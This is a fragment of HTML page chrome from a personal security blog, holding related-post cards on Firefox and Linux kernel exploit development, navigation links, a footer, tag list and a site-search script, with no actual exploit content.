src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Firefox-tip-note/"><div class="card-body"> <span class="timeago small" > Mar 23, 2020 <i class="unloaded">2020-03-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Firefox tip note</h3><div class="text-muted small"><p> Tip note for Firefox analysis &amp; exploitation Index Index Firefox note Build Debug Array object Understand Type Masking Shape...</p></div></div></a></div><div class="card"> <a href="/posts/Linux-Kernel-Exploit-Development-lab1/"><div class="card-body"> <span class="timeago small" > Sep 23, 2019 <i class="unloaded">2019-09-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux Kernel Exploit Development (Part 1/10)</h3><div class="text-muted small"><p> Linux Kernel Exploit Development with VMware - Lab1::Debugging Environment 목차 목차 Debugging Environment Debugger Attach Debug Program Debugging Environment 우선 디버깅 환경을 살펴보니 MasterVM와...</p></div></div></a></div><div class="card"> <a href="/posts/Linux-Kernel-Exploit-Development-lab2/"><div class="card-body"> <span class="timeago small" > Sep 23, 2019 <i class="unloaded">2019-09-23T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux Kernel Exploit Development (Part 2/10)</h3><div class="text-muted small"><p> Linux Kernel Exploit Development with VMware - Lab2::Module Debugging 목차 목차 The Kernel Module Debugger Attach to Kernel Module Debug Kernel Module The Kernel Module TestVM의 mod_sam...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Firefox-tip-note/" class="btn btn-outline-primary" prompt="Older"><p>Firefox tip note</p></a> <a href="/posts/DLL-Hijacking/" class="btn btn-outline-primary" prompt="Newer"><p>DLL Hijacking Note</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/nonetype_pwn">Wonyoung Jung</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/debugging/">debugging</a> <a class="post-tag" href="/tags/tutorial/">tutorial</a> <a class="post-tag" href="/tags/tips/">tips</a> <a class="post-tag" href="/tags/firefox/">firefox</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/1-day/">1 day</a> <a class="post-tag" href="/tags/analysis/">analysis</a> <a class="post-tag" href="/tags/ctf/">ctf</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://nonetype.kr{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
